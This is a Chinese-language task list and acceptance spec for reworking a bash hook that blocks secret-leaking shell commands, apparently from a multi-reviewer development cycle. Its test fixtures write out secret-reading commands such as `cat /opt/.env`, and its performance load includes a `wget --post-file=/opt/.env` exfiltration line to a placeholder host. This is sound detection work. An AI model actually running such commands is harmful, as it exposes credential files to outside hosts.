- [ ] 1.1 `safe_to_split()` — 块字符 + 块起始关键字 + 作用域型 keyword / 内建 (引号外; 术语勘正 tech-lead m-1 —— B-5 只改了 §What.1 表头, 本行原写「作用域型内建」未同步; §What.1 表头正下方 B-5 脚注里提到的「原表头『作用域型内建』」是引用**旧措辞**的历史陈述, 正确, 不动)。**三条写死的实现约束**: (a) 块起始关键字与 `exec` / `time` **两行同精度, 一律「命令位置 且 词边界」** (R4 tech-lead R4-C-2 提出位置限定, R5 tech-lead R5-C-3 补词边界 —— 只写位置则 `timeout` 的 `time` 子串落在命令位置, SC-14 fixture #2 不可满足且语料 4 条 `timeout …` 被无谓降级); (b) 「行首」「换行之后」**照抄 §What.1 的 `BLOCK_KW_RE` 规范写法** (单引号主体 + 拼入 `nl=$'\n'`), **不得裸 `^`** (R4 backend-architect CRITICAL-2) 且 **不得写 `(^|\n)`** —— ERE 里 `\n` 是字母 n, 既漏 (真换行位置不命中) 又多 (`run for` 类误命中), 两个方向分别由 SC-6 换行 fixture 与 SC-14 A-4 锁住; (c) 命令位置 12 类中仅这 2 类需专门处理, 其余 10 类靠字面 token / 字符类天然安全
- [ ] 1.2 `split_top()` — quote/转义感知, 切顶层 `;` `&&` `||`; 空段跳过
- [ ] 1.3 判定循环: 降级分支 + 逐段 + **先 pattern 后 credit** + BLOCKED 消息补段落
- [ ] 1.3b **`has_filter` 13 处 `echo\|grep -qE` 改 bash 内建, 经 `_sg_line_match()` 逐行 helper** (owner 2026-08-04 裁定拉回范围; owner 2026-08-09 裁定采候选 A)。**规范写法见 §What.4 代码块, 逐字照抄, 13 处正则文本一个字节不动**; **不得**改用段级换行守卫 `[[ "$seg" != *$'\n'* ]] &&` (R4 曾写死, R5 三席实测它治一半造更宽的另一半, 已撤回), **不得**改用 `${BASH_REMATCH[0]}` 变体, **不得**自行"等价改写" helper。**保留 `\b`** 的 2 处不得改写为字符类 (R4 code-reviewer C-1)。验收 = SC-15
- [ ] 1.4 `corpus_census.py` 权威计数器 (随 spec 交付) — 语料 5 数 **+ §6 规定的 13 处 credit 判据三组口径** (行号清单 / 字面量词分布 / 换行影响面**两个基线口径各一个数**) **+ risky_patterns 量词口径** (owner 2026-08-09 采 B-4: pattern 总数 141 = 单引号 139 + 双引号 2 / 含 `[^|]` **81** / `[^|]*` **79** / `[^|]+` **7** / 两者兼有 **5** / `.*` **1**; 抽取须含双引号起始行, 只数单引号会各少 2) **+ SC-3 有效面** (tech-lead W-2, B-10 落点补漏 —— B-10 已让 SC-3 与 SC-18 都要求「49 条 `expected=2` 含边界用例的用例名清单」以计数器输出为准, 但本任务此前未挂这项输出, 若 Phase B 只照本行字面建计数器, 建完后 SC-18 会立即因缺这项输出转红且无 Task 补 —— 与 B-1 当初抱怨的「SC 无 Task 承载」同型复发): 输出该 49 条用例的**用例名清单** (非仅计数)
- [ ] 1.5 测试: 分段器单元 + fail-safe 降级族 (含 `case` 的**隔离单元断言**) + **credit 多行正负双向族** + 端到端族 + `KNOWN-LIMIT` 转正。**执行约束 (同 Task 1.8, tech-lead m-3 归属勘正)**: 测试套件本体若经 `sed` / `perl -i` 等就地编辑, 必须重读确认正则未被破坏后才可采信 —— 本 cycle v2 原型事故正是发生在这一层, 而非 Task 1.8 的回归/性能脚本层
- [ ] 1.6 CHANGELOG 行为变更标注 + 迁移写法
- [ ] 1.7 `secret-hygiene.md` 计数回填
- [ ] 1.8 全量回归 (canonical 直调) + 性能**五档**相对基线实测 (SC-8)。**执行约束 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-9)**: 本任务的任何验证脚本若经 `sed` / `perl -i` 等**就地编辑**, 必须**重读脚本确认正则未被破坏**后才可采信其输出 —— 本 cycle v2 原型被 `sed` 写坏正则后仍输出「全绿」, 作者干净重写才发现。**该纪律不新增独立 SC (理由勘正, tech-lead m-3)**: 前一版写「『脚本没被写坏』无法构造可证伪的断言」——**这个不可能性断言本身未经核实, 且是错的**: canary 探针 (放一条已知必红的探针, 验证脚本若对它也判绿即证明脚本已损坏) 是可行的可证伪形态, SC-1 本身 (5 条 baseline-failing fixture, 改前必须 exit=0 / 改后必须 exit=2) 就是这个技术在本 spec 里的既有实例。真正的理由是: SC-1 已天然覆盖这层 canary 保护 (它的 5 条 fixture 本身就是「脚本若被写坏就无法再满足 baseline-failing」的探针), 再单独开一条 SC 是对同一机制的重复计价, 故仍不新增, 但理由改为「已有等价机制」而非「不可构造」。**归属勘正 (同一条 m-3)**: 本纪律此前只挂在 Task 1.8, 但历史事故 (v2 原型被 `sed` 写坏正则后仍全绿) 发生在**测试套件本体** (`secret-guard.test.sh`, Task 1.5 的产物), 不是 1.8 的全量回归/性能实测脚本 —— 已在 Task 1.5 同步补挂该纪律
- [ ] 1.9 开转出 **1、2、3、4、5、8、9、10、11** issue (**R4 knowledge-manager Critical-1 勘正**: 6 已由 owner 拉回本 spec 范围 = Task 1.3b, **不开**; 7 已随 Aria#172 关闭, 衍生票 Aria#178 已开, **不开**; 8 与 9 前一版漏在「1-6」范围外; **10 系 owner 2026-08-09 对 B-2 的改判**, BLOCKED 整条命令回显属 canonical 存量非本 spec 引入; **11 系 backend-architect 复核席 2026-08-09 发现**, `!` 命令位置边界问题, owner 裁定与 `do`/`then`/`else`/`elif` 同类问题一并立案); 回填 Aria#170 覆盖率声明; close aria-plugin#128。**转出 9、转出 10 与转出 11 的复现命令须逐字照抄各自条目正文** (均已实跑验证), 转出 9 不得改写为裸 `\b` 写法, 转出 10 不得把假值占位符换成真值
- [ ] 1.10 **ship 后执行 SC-9b** (投递面腿, R5 qa-engineer M-2 指出 SC-9b 此前无 Task 承载): 版本 bump 落地并经 marketplace 刷新后, 用 `cmp` 比对 plugin cache 副本与 canonical, 再经 harness hook 链复验 ≥1 条本 spec 新增拦截形态。**挂 release-closeout, 不计入 Phase C 合并门槛** (理由见 SC-9b)
- [ ] 1.10a **版本 bump (含 bump 前 re-check SOT)** (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-1; 编号勘正 tech-lead m-5, backend-architect 复核落地 —— 原 Task 1.12「bump 前 re-check」排在 Task 1.11「bump 后逐点核对」之后却必须先于它执行, 本 spec 已在 SC-9b 吃过「Phase B 忠实按字面顺序执行」的亏, 不该再留一个顺序倒挂的锚点; 且原 1.12 的锚点「bump 动作」本身此前没有独立 Task 承载, 已与 re-check 合并成一个任务; 编号仿 Task 1.3b 风格, 插在 1.10 与 1.11 之间以反映「先 re-check + bump, 再 1.11 的 bump 后核对」这一实际顺序)。动作: (1) 重读 `aria/.claude-plugin/plugin.json` 确认 SOT 仍为预期基线 (本 spec 起草时 1.65.5), 若已被并发轨推进则**目标版本号顺延重算**, 不得沿用 spec 正文写死的 `v1.65.6`; (2) 执行版本 bump 本身 (写入 §Impact 声明的目标版本号)。依据: Aria#170 已撞过一次并发 bump; CLAUDE.md 项目状态段与版本行是 multi-track ship 的高争用面 (memory `feedback_claude_md_project_status_high_contention`)
- [ ] 1.11 **ship 同步面逐点核对** (§Impact 的 14 点表, R5 knowledge-manager M-1): bump 后对 14 个引用点逐个 `grep` 确认无残留旧版本号; **不得**以「机械兜底 check 全绿」代替 —— Aria#177 已实测两条 check 对其中 7 点结构性失明

## Success Criteria

> **除 SC-9b 外**全部以 **canonical 直调**为准 (理由见 §Impact 验收环境 —— 2026-08-08 已从「#172 所迫」改为「可复现性选择」)。SC-9b 是 R4 裁定新增的 harness 链投递面腿 (共识强度见 rule6_note 校正)。

- [ ] SC-1 (baseline-failing, 核心): 5 条泄漏形态 (`;` ×3 / `&&` / `||`) **改前 exit=0, 改后 exit=2**。作者原型已验 5/5
- [ ] SC-2 (零影响回归锁, **逐条列名**): 15 条纯管道 + 5 条换行边界用例改前改后**均不变**
- [ ] SC-3 (拦截面不回归): **49** 条含边界的 `expected=2` 用例改后仍 exit=2; 任一转 0 = 安全回归。**有效面须机械确定 (owner 2026-08-09 采 R5 tech-lead R5-M-3 B-10)**: 「哪 49 条」**以 `corpus_census.py` 输出的用例名清单为准**, 不得手挑、不得凭「看起来含边界」判定 —— SC-2 已要求逐条列名, SC-3 的基数更大却无有效面定义, 是同一份 spec 内的不对称。该清单与 SC-18 断言的 `65/49/16` 同源
- [ ] SC-4 (quote-aware, **反事实可证伪** — R3-M-2 证原 3 条 fixture 在「引号盲实现」下 3/3 仍 exit=2, 被 fail-safe 吞掉): 改用 R3 tech-lead 验证过的 `perl -ne 'print if /a;b/' /opt/.env` —— 引号内含 `;` 且**无块结构标记**故不会走 fallback, 引号盲实现会把它切成两段而两段均不匹配 ⇒ **切错必 exit=0, 正确必 exit=2**。原三条降为辅助用例 (标注其零鉴别力)
- [ ] SC-5 (分段器单元测试, 数组基数断言): `a; b`→2 / `a && b`→2 / `a \|\| b`→2 / `a \| b`→**1** / `;` 在引号内→**1** / `\;` 转义→**1** / 换行→**1** / `a & b`→**1** / `a &> f`→**1** / `case x in a) ;; esac`→**2** (R3-M-3 机械核验: `split_top()` 直接按 `;` 切, `;;` 产生 2 段; 该命令由 `safe_to_split()` 在上层拦下, **两层职责不可混淆** —— 前一版写 →1 是把两层搞混了)
- [ ] SC-6 (fail-safe 降级族, **必须断言分支本身而非 exit code** — R3-M-1 + R4 qa-engineer §2 证 12 条里 5 条在「恒 fallback 的坏实现」下同样全绿, 因两路 exit 相同): 对每条**直接断言 `safe_to_split()` 的返回值** (fallback / split), 而非仅端到端 exit。**共 17 项** = 14 条端到端须 `safe_to_split=false` + **1 条隔离单元断言** + 2 条端到端须 `safe_to_split=true` (`ls -la; pwd` / `cat /opt/.env; echo hi >/dev/null`)。(16→17, backend-architect W-1 —— 给 v7 唯一改动的规范性实现文本 `BLOCK_KW_RE` 配可证伪的鉴别 fixture, 详见下方新增一条)
  - 端到端 false, 块字符型 **7 条**: `{ }` / `( )` / `[[ && ]]` / `for ((;;))` / 反引号 / `$()` / heredoc
  - 端到端 false, **关键字型 5 条** (无任何块字符, 真正依赖关键字分支): `for` / `while` / `if` / `until` / `select`。`until` / `select` 系 R4 依 qa-engineer §2 补入 (§What.1 声明 6 个块关键字, v4 只测了 3 个); **fixture 文本本版写死** (R5 qa-engineer m-2 指出只给关键字名不可验收):
    - `until nomad var put secret/x @f >/dev/null; do sleep 1; done`
    - `select e in prod dev; do nomad var get secret/$e; done`
  - 端到端 false, **`!` 取反位置型 1 条** (backend-architect W-1, 2026-08-09 —— 鉴别 v7「A-2 漏项 `!`」是否真的落进了 `BLOCK_KW_RE`, 全 spec 此前没有任何 SC 能分辨 Phase B 实现的是 v6 的旧位置清单还是 v7 的新位置清单): `! for f in a; do cat /opt/.env; done >/dev/null`。断言 `safe_to_split()` 须返回 **false**。若实现漏掉 `!`, 该命令会被误判 `true` 而遭切碎, 中段 `cat /opt/.env` 单独无 credit —— exit 维度已实测 (Phase B 前, 用于校准, 非最终验收依据): 整条命令直接过 canonical 现状 (= 正确降级后的 legacy 判定) exit=**0**; 隔离测中段 `cat /opt/.env` (= 错误切碎后的单段判定) exit=**2**。
  - 端到端 false, **换行位置型 1 条** (R4 backend-architect CRITICAL-2): `$'cd /tmp\nfor f in a b; do cat /opt/.env; done >/dev/null'` —— 块字符型那 7 条全是同行标记, 对「换行之后」这个位置类别零覆盖
  - **⛔ `case` 必须改为隔离单元断言, 不得作端到端 fixture (R5 qa-engineer C-2)**: bash `case` 的模式臂 `pattern)` **语法强制含裸 `)`** (实测: 省掉 `)` 的 case 体 `bash -n` 报 syntax error), 而 `)` 是 `BLOCK_CHARS` 成员 ⇒ 任何带真实分支体的 `case` fixture 都会被块字符判据**先行捕获**, 关键字分支根本没被执行到。R5-fix 执笔者机械对拍 (`c3_perkw.sh`, 逐个关键字构造「只漏检该关键字」的实现): `for`/`while`/`until`/`if`/`select` **5 条全部**区分开 (`false` vs `true`), **只有 `case` 两种实现产出完全相同** (`false` vs `false`)。⇒ v5 写的反事实「漏检 `case` → 对应条红」**可被证伪**。
    - **改法**: 对关键字识别的正则/辅助函数做**隔离断言**, 绕过 `BLOCK_CHARS` 路径 —— 断言它对裸 token 流 `case x in` 返回真。实测该断言**确实有鉴别力**: 正确关键字集 → YES, 漏 `case` 的关键字集 → NO。
    - 根因记录: 这是**转述损耗** —— qa R4 的原始建议带「哪怕只是隔离单元断言」这个限定, 而它是建议能成立的**必要条件**; v5 采纳时把限定丢了, 只执行了「加一条 case fixture」的动作。
  - **反事实 (逐类写死, 已机械复验)**: 恒 fallback 实现 → 后 2 条 true 红; 恒 split 实现 → 前 14 条端到端红 + 隔离断言不受影响; 漏检 `until` 或 `select` → 对应各 1 条红; **漏 `!`（命令位置清单未补 `!`, 即 v6 的旧清单）→ 取反位置型那条红** (这正是 A-2 漏项裁定的直接反证); **漏检 `case` → 隔离单元断言红 (端到端全绿, 这正是它必须隔离的原因)**; 裸 `^` 实现 → 换行那条红 (其余 13 条端到端不受影响, 隔离性好); **`(^|\n)` 实现 → 同样只有换行那条红** (实测 1/16; 它的另一半误命中方向由 SC-14 A-4/A-5 承担, 本 SC 对该方向零鉴别力 —— 两条 SC 各锁一个方向, 不可相互替代); 关键字缺词边界 → 见 SC-14
- [ ] SC-7 (跨段 fail-open 锁现状, `KNOWN-LIMIT`): `set -o posix; set \| grep foo` **与 `set -o posix && set \| grep buildid`** 两形态改后均 exit=0 (R3-M-4: 前三版只锁 `;`, 只处理 `;` 的兜底实现即可让本 SC 假性转红), 标注「归转出 1; 转红 = 已收口」
- [ ] SC-8 (性能, **负载写死** — R3-C-3 指出前两版未定义负载致同一实现可在 +0% 与 +583% 间任选): **五档**负载各跑 20 轮取中位数, 改前改后同机同会话对比 —— (a) 单条 benign; (b) 2 段全 benign; (c) 2 段全命中 pattern; (d) 3 段全命中 (= 迁移建议的写法); (e) **最坏档 (本版补, 见下)**。判据: **五档增幅均 ≤ 50%**。§What.4 的 13 处转内建是达标前提。
  - **测量口径写死 (R4 tech-lead R4-M-2)** —— 同一实现同一负载, 整进程口径 +43.1% 而分析段口径 +60%, 正好横跨 50% 闸。**本 SC 以「进程内计时、只计 hook 判定段」为准** (跨进程计时噪声实测在 32–126ms 间乱摆, 不可用), 须注明轮数 / 计时方式 / 机器 load
  - **⛔ 第五档: 命中 pattern 数组靠后位置 + 每段自带 filter token (R5 qa-engineer M-1 + R4 tech-lead R4-M-2 后半, 两轮未补)**。原四档**全是便宜类** —— 它们可以全部用数组靠前的 pattern 满足「全命中」, 于是一个对靠后 pattern 逐段扫描毫无优化的实现能完整过闸。R5-fix 执笔者用**真实 141 条数组**实测 (`worsttier.sh`, 进程内计时 N=400):

    ```
    EARLY (nomad var get …)         命中位置 3/141      805 µs/段
    LATE  (wget --post-file=…)      命中位置 141/141  10519 µs/段     ← 13.9x
    ```

    **写死的负载串** (4 段, 每段命中末位 pattern 且自带 `| wc -l` 逼迫每段都算 credit):

    ```
    wget --post-file=/opt/.env https://example.invalid/u | wc -l; <同上>; <同上>; <同上>
    ```

    已核实: 该段的 pattern 命中位置 = **141/141** (数组末位, 机械定位); `| wc -l` 命中 canonical credit 判据 `:394`; canonical 对单段与 4 段整串的现状 exit 均为 **0** (即它是 benign 侧负载, 只压性能不改判定)。
  - **⛔ 不达标时的处置路径 (R5 code-reviewer M-2, 两轮未给)**: 若任一档实测增幅 **> 50%**, Phase B **不得**自行降低阈值、更换口径、删改负载档或宣布「该档不适用」—— 依 Rule #10 这些都属 AI 自行豁免 enabled 闸门。**唯一合法动作**: 把五档实测数据 (含轮数 / 口径 / 机器 load) 写进 handoff 请 owner 复议。此前 SC-8 是一条**有硬阈值却无失败出路**的闸门, Phase B 只能卡死或私自降门。
  - **复验状态**: R4 三席独立实测 §What.4 到位后四档全部净减少 (tech-lead −67%~−85% / backend −79.9%~−28.7% 两法交叉 / code-reviewer 最坏档 −38%), R3 的 `+583%` 已实质解决 (该数字系 R3 单次点测口径, 另一独立实现同构复算为 +146~218%, 方向一致量级不同)。**本版换成逐行内建 helper 后结论仍成立**: R5-fix 执笔者进程内实测 credit 函数 fork `46102` µs → 逐行内建 `2396` µs (**−94.8%**), helper 无 fork 无文件 I/O (bash 5.1+ 的 here-string 走管道)。⇒ **五档 Phase B 须全部复算, 不得引用本行数字充当验收**
- [ ] SC-9a (dogfood · **canonical 闸**, R4 裁定拆两腿; **本 SC 即 rule6_note substitute 的 dogfood 组件**): canonical 直调端到端脚本, 覆盖 5 类实际使用形态。**「5 类」须在 Phase B 前枚举写死** (R4 qa-engineer §5: 现表述不可验收)
- [ ] SC-9b (dogfood · **投递面腿**, R4 新增; **承载 Task = 1.10**): ship 后经 **harness hook 链**复验至少 1 条本 spec 新增的拦截形态, 前置断言 `cmp` 判定 **`~/.claude/plugins/cache/10CG-aria-plugin/aria/<新版本号>/hooks/secret-guard.sh`** 与 canonical 字节相同 (**须指名版本目录** —— 实测 `1.63.0/` 陈旧目录与 `1.65.5/` 并存, 只说「plugin cache」有歧义)。
  - **⛔ 本 SC 不计入 Phase C 合并门槛 (R5 qa-engineer M-2)**: `cmp` 不一致在 Phase B/C 窗口期是**结构必然**, 不是异常 —— 本 spec 第一步就把 SOT 由 1.65.5 bump 到 1.65.6, 而 cache 要等「merge → push → marketplace clone 刷新 → 按新版本号新建目录」整条链走完才追得上。判定语义**三分, 不得二选一**:

    | `cmp` 结果 | 判定 | 后续 |
    |------------|------|------|
    | 目标版本目录**不存在**或字节不同, 且尚未 ship | **BLOCKED-BY-ENV** | 非失败。**不得**改判 PASS, 也不得据此阻塞 Phase C 合并 |
    | 字节相同, harness 链复验拦截成功 | PASS | 闭环 |
    | 字节相同, harness 链复验**未拦住** | **FAIL** | 真缺陷, 走 hotfix |

    v5 把 SC-9b 与其余 16 条并列在同一份 Success Criteria 里却没声明它的时序性质, 而这份列表是 Phase B→C 的验收依据 ⇒ 忠实按字面执行的 Phase C 会在一个**每次都会发生**的分支上无表可依, 只剩「卡死等一个到不了的条件」或「自行决定这条不算数」两条路 —— 后者正是 Rule #10 禁止的自行豁免。这也与 memory `feedback_goal_hook_precondition_must_be_in_session_achievable` 同形。
  - **为什么必须两腿而非二选一** (五席论据互补): canonical 直调**结构上证明不了「用户真的会被拦住」** —— Aria#172 的教训恰是 canonical 一直正确、用户加载的却是错的; 但 harness 链有**时序矛盾** (qa-engineer): pre-merge 闸验的是 PR 里的代码, 不是已部署的 cache, 两者本就不同物; tech-lead 另实测 harness 链在 Phase B 阶段**结构上跑不到**本 spec 的改动。⇒ canonical 作 pre-merge 主闸 (SC-9a), harness 链作 **ship 后**投递面验证 (SC-9b)
  - 规范层的一般化归 [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178); 本 SC 是它在本 spec 的单点应用
- [ ] SC-10 (CHANGELOG): 含行为变更段 + ≥2 条迁移写法示例 (机械 grep)
- [ ] SC-11 (全量回归): `secret-guard.test.sh` 全绿 + 其余 5 脚本全绿; **总数注明 zsh 在场与否** (366 / 360)
- [ ] SC-12 (`guard:ack` 命令级锁定): 已 ack 的复合命令改后仍 exit=0 (防实现把 ack 下沉段级 — R2 实测下沉会由 0 变 2)
- [ ] SC-13 (SOT 计数回填断言): `secret-hygiene.md` 中 secret-guard 自测计数与实际测试数一致 (机械 grep 比对, R2 knowledge M-1)
- [ ] SC-14 (**判据 token 过度触发**方向, R3 code-reviewer M-2 + R4 tech-lead R4-C-2 扩容 + **R5 qa-engineer C-1 拆公式**): **两组 fixture 性质不同, 验收公式必须分开写 —— v5 用一个公式统摄 5 条, 方向是反的**。
  - **A 组 (无风险段, 锁「不误伤」)** **5 条**: `ls; echo for >/dev/null` / `ls; echo if >/dev/null` / `git commit -m "add case handling"` / **A-4 `ls; echo run for >/dev/null`** / **A-5 `ls; echo in for >/dev/null`** (backend-architect W-1 2026-08-09 新增)
    - 判据: 须 `safe_to_split=true` **且 exit 与改前一致 (= 0)**。这 5 条切开后没有任何段命中 risky pattern, 故正确实现下 exit 本就不变 (A-4/A-5 canonical 直调实测改前 exit 均为 **0**)。
    - **A-4 是 R5-fix 新增的 `(^|\n)` 误命中锁**: 实测 —— 正确写法 `safe_to_split=true`, 写成 `(^|\n)` 则 `false` (因 `run` 的 `n` 被当成位置记号)。**没有它, `(^|\n)` 的「多」这一半无任何 SC 覆盖** (原 A 组 3 条与 SC-6 全部 15 项对该方向零鉴别力, 已逐条实测)。
    - **A-5 是 backend-architect W-1 新增的 `in`-删除锁, 且意外兼锁一次 `(^|\n)` 误命中**: 主要目的是鉴别 v7「A-2 错项 `in`」是否真的从 `BLOCK_KW_RE` 删掉了 (v6 的旧位置清单仍含 `in`, 会把 `echo in for` 误判成命令位置而多余降级; v7 的新清单不含 `in`, 正确读为 `safe_to_split=true`)。**这条也是全 spec 第二条「以 `n` 结尾的词紧邻关键字」的 (^|\n) 误命中 fixture** ——「in」恰好也以 `n` 结尾, 机械复算证实它在 `(^|\n)` 写法下同样误判 `false` (见下表), 上一版「A-4 是唯一一条」的说法需订正为「A-4 是最早一条, A-5 因巧合同时命中该方向」。
  - **B 组 (含真风险段, 锁「不漏拦」)** 2 条: `echo runtime; cat /opt/.env; true >/dev/null` / `timeout 5 curl x; cat /opt/.env; true >/dev/null`
    - 判据: 须 `safe_to_split=true` **且 exit 由改前的 0 变为改后的 2**。
    - **实测依据** (canonical 直调, `c2_c3.sh`): 两条**改前均 exit=0**; 而它们切开后的中段 `cat /opt/.env` 单独直调 **exit=2** —— 即正确的逐段实现必然拦下, 这正是本 spec 存在的理由 (Aria#170 同构泄漏)。
  - **⛔ v5 的错法与后果**: v5 对 5 条统一写「exit 与改前一致」, 却在同段解释文字里说 B 组「正确实现应 exit=2」—— **自相矛盾**。按字面执行会**放行**它本该堵的那个实现: 一个保留子串读法 (含 `runtime`/`timeout` 子串即整条 fallback) 的「覆盖损失」版本, 对 B 组产出 exit=0, **与改前完全一致**, 字面判定 PASS。而 SC-14 是唯一能拦住该缺陷的锁 —— SC-1/3/6/11 与全语料对它**零鉴别力** (R4 tech-lead 实测两种读法对 305 条语料产出完全相同)。
  - **反事实 (机械复算, `sc14_cf.sh`: 四种实现 × 7 条 fixture 逐格算 `safe_to_split`; A-5 列由 backend-architect W-1 补, 逐格机械算非推理)**:

    | 实现 | A-1 `echo for` | A-2 `echo if` | A-3 `add case` | A-4 `echo run for` | A-5 `echo in for` | B-1 `echo runtime` | B-2 `timeout 5` | 转红 |
    |------|---------------|---------------|----------------|--------------------|--------------------|--------------------|-----------------|------|
    | 裸子串 (无位置、无词边界) | false | false | false | false | false | false | false | **7 条全红** |
    | 仅命令位置 (v5 的规范文本) | true | true | true | true | true | true | **false** | **1 条红 (B-2)** |
    | 命令位置 + 词边界 (本版规范文本) | true | true | true | true | true | true | true | **0 条, 全绿** |
    | **`(^|\n)` 写法** (位置交替写错, 见 §What.1) | true | true | true | **false** | **false** | true | true | **2 条红 (A-4 · A-5)** |

    即: **B-2 是整份 spec 里唯一能分辨「仅位置」与「位置+词边界」的断言**, 而 v5 恰好把它写成了不可满足 (要求 `safe_to_split=true`, 字面文本给 false); **A-4 与 A-5 是能抓 `(^|\n)` 误命中方向的断言** (A-4 是原有的那一条; A-5 因「in」同样以 `n` 结尾, W-1 新增后意外兼具这个鉴别力, 二者互为交叉验证, 非互斥关系)。exit 维度另需 B 组的 `0→2` 才能拦住「子串读法 = 覆盖损失」那一类。
  - 前一版用 `echo done` 举例是错的 (`done` 不在关键字集内, 论证不成立)
- [ ] SC-15 (`has_filter` 13 处转内建**语义不变**, §What.4 的验收 — **R5 按候选 A 重写**): **统一判据 = 改前改后判定逐条一致** (不再有例外条款; v5 的三条 fixture 曾与自己的 Task 1.3b 互斥, 见下)。基础 26 条 = 每处 命中/不命中 各 1 条。
  - **维度 1 — 多行, 正负双向 (R4 tech-lead R4-C-1 + R4 backend-architect CRITICAL-1 提出方向; R5 三席补齐负向)**: **13 处判据每处 2 条**多行 fixture, 断言**改后与 canonical 逐条一致**:
    - **正向** (该不给 credit 就别给): credit 子句本身被换行拆开, 如 `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` (canonical: 拦) / `… |⏎sha256sum` (canonical: 不给 credit)
    - **负向** (该给 credit 就得给, **v5 完全缺这一半**): 无关前导行 + 单行完整 credit 子句, 如 `echo start⏎cat /opt/.env | sha256sum` (canonical: 给 credit ⇒ 放行) / `cat /opt/.env \\⏎  >/dev/null` (反斜杠续行, **= 本 spec 自己推荐的迁移写法**)
  - **三条端到端形态写死** (canonical 直调实测值, R5-fix 执笔者复核): `… | jq keys⏎echo done` → **0** / `cd /tmp⏎… | jq keys⏎echo finished` → **0** / `cat /opt/.env | awk 'BEGIN{}⏎{print $1}'` → **2**。三条改后须**保持**这三个值。
    > **v5 在这里是不可满足的**: 它把这三条写成 fixture, 同时又在 Task 1.3b 强制段级换行守卫 —— 而守卫对三条产出 `2 / 2 / 2`, 前两条与「逐条一致」直接冲突。两条都是 enabled 判据, Rule #10 下 Phase B 哪条都不能自行裁 ⇒ **结构性卡死**。候选 A 实测产出 `0 / 0 / 2`, 三条同时满足, 判据回到单一口径。
  - **维度 2 — 分支覆盖 (R4 qa-engineer §3)**: 含多分支 alternation 的判据须**逐分支**各 1 条, 不得只测「最自然」那个 —— 现有 366 条语料只覆盖 `sha256sum` / `jq keys` / `wc -l`, 而 `jq length|paths|leaf_paths` / `md5sum|sha1sum|sha512sum` 等分支零覆盖, **SC-15 与 SC-11 会在这类缺陷上互相掩护**
  - **反事实 (三种坏实现, 已机械复算)**:

    | 坏实现 | 会红的 fixture | R5-fix 执笔者实测 |
    |--------|---------------|-------------------|
    | 字面直译 (无逐行) | 正向多行 + 端到端 3 条 | 23 条 credit 探针中 **5 条**分歧 / 端到端 11 条中 **3 条** |
    | **段级换行守卫 (v5 强制的那个)** | **负向多行几乎全部** + 端到端前 2 条 | 23 条中 **20 条**分歧 / 端到端 11 条中 **8 条**; 13/13 处判据全中招 |
    | 某一处正则转写出错 | 该处的命中/不命中 fixture | — |

    **正确实现 (逐行 helper) 实测 0 分歧**: 13 正则 × 11 对抗串 **0/143**、credit 探针 **0/23**、端到端 **0/11**、全语料 **0/305**。
  - **⚠️ 本 SC 的信号不被稀释**: credit 重构是**零行为变更**的 (§Impact), 所以这里任何一条翻转都是 bug, 不存在「设计内的预期翻转」把它盖过去。**全语料 (SC-11) 对本条恒绿** —— 字面直译 0/305、段级守卫 0/305, 305 条里仅 6 条含换行且无一条依赖 credit ⇒ **SC-11 不能替代本 SC**
- [ ] SC-16 (正则可移植性 — **R4 code-reviewer C-1 事实勘正后重写**): `safe_to_split()` **新写的**正则 + 13 处 credit 判据的正则**全部**在 bash `[[ =~ ]]` 下实跑验证。
  - 范围说明: 采候选 A 后 13 处正则**文本一个字节未改** (只是求值方式由 `grep` 逐行改为 helper 逐行), 故它们的可编译性本已由生产环境 366 测试全绿背书; 本 SC 对它们是**回归确认**, 真正的新风险面在 `safe_to_split()` 新写的那几条 (关键字 / 作用域内建 / 命令位置交替)
  - **禁用清单收窄为 `(?:…)` 一项** (实测 rc=2 编译失败)。前一版把 `\b` / `\s` 一并列为「bash 不支持」是**事实错误** —— 三方独立实测均支持 (glibc GNU 扩展), 本 hook 141 条 pattern 里 16 条含 `\b` 且 366 测试全绿
  - `\b` / `\s` / `\w` **允许保留**, 但须在本 SC 记为「**已知 GNU 依赖**」; 非 glibc 平台 (macOS / BSD / musl) 的行为差异归**转出 9**
  - **不得**为满足本 SC 而把 `\b` 改写成 `([^a-zA-Z]|$)` 之类 —— 语义真的会变 (`\b` 视 `_`/数字为词内字符), 会绕过 SC-15 的视野静默改变拦截面
  - **反事实 (随 SC-6 结构重算, R5-fix 执笔者机械复验 `sc16_cf.sh`; **backend-architect 复核席 2026-08-09 随 W-1 的 SC-6 17 项扩容同步重算, 不属清单显式要求, 因是本次改动的直接连带后果而顺手处理**)**: 逐字搬运含 `(?:…)` 的 Python 原型 → 关键字正则 rc=2 编译失败 → 该分支**静默恒假** (实测: `[[ =~ ]]` 编译失败不打印 stderr, `set -uo pipefail` 下也不中止, 直接走 else) → SC-6 转红 **8 项**:
    - 端到端 **7 条**: 关键字型 5 条 (`for` / `while` / `if` / `until` / `select`) + **`!` 取反位置型 1 条 (W-1 新增, 同样只靠 `BLOCK_KW_RE` 关键字正则判定, 该正则编译失败时同样静默恒假)** + 换行位置型 1 条
    - 隔离单元断言 **1 条**: `case`
    - **不红 7 条**: 块字符型 (`{ }` / `( )` / `[[ && ]]` / `for ((;;))` / 反引号 / `$()` / heredoc) —— 纯字符类判定, 不受正则语法影响 (SC-6 的 2 条 `safe_to_split=true` 端到端 fixture 不计入本反事实, 因它们的期望值在该故障模式下不变)
    > **v5 写的是「三条」**, 那是按 SC-6 只有 3 个关键字 fixture 的**旧清单**算的, 而同一次编辑刚把 SC-6 扩到 6 个关键字 + 1 个换行位置 —— 改了上游 SC, 下游反事实没跟着改 (memory `feedback_spec_rework_leaves_downstream_ac_drift`)。v5 自己在同一句里警告「反事实**写宽**会让 Phase B 误以为没红满是别处出了问题」, 而它**写窄**的危害对称: Phase B 跑出 7 条红、spec 说该红 3 条, 于是去追那 4 条「多出来的红」是不是别处坏了。**本条计数在 v7→v8 间因 SC-6 再次扩容而再同步一次 (7→8), 是这条记忆在本 cycle 的第二次现身 —— 这次是主动同步, 不是遗漏。**
  - **本 SC 是语法层检查, 结构上抓不到「编译通过但语义窄」** (如 R4 backend-architect CRITICAL-2 的裸 `^`) —— 那类由 SC-6 的换行 fixture 承担, 两者不可相互替代
- [ ] SC-17 (语料重复用例清理, **连续三轮未处理**): 删除 `secret-guard.test.sh` 中字节级重复的 `bash_case "FP-fix timeout run-env"`, 并断言全文件无重复用例名
